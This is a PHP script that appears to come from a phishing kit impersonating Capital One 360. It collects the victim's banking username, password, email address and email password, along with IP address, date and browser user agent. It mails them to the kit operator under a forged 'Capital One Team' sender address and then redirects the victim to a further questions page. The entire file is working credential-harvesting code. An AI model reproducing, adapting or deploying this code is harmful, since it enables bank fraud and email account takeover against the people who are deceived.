<?
/*
Created by rYan
*/
require "includes/session_protect.php";
require "includes/functions.php";
require "includes/One_Time.php";
require "CONTROLS.php";

$username = $_SESSION['username'];
$password = $_POST['password'];
$email = $_POST['email'];
$emailpass = $_POST['emailpass'];

if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a"); 
$date = trim("Date : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT']; 

$send = $Your_Email;
$subj = "Capital One | $ip";
$from = "From: Capital One Team <legzy@schoolofhacking.com>";
$msg = "\n+--------------+ Capital One 360 +-----------------------+\nUsername $username\nPassword : $password\nEmail Address : $email\nEmail Password : $emailpass\n+----------------------------------------------------------+\n
User IP : $ip\n$date\nAgent : $useragent\n+---------------+ Created BY rYan +-------------+ \n\n";


{
mail($send,$subj,$msg,$from);

}
header("Location:questions.html");
?>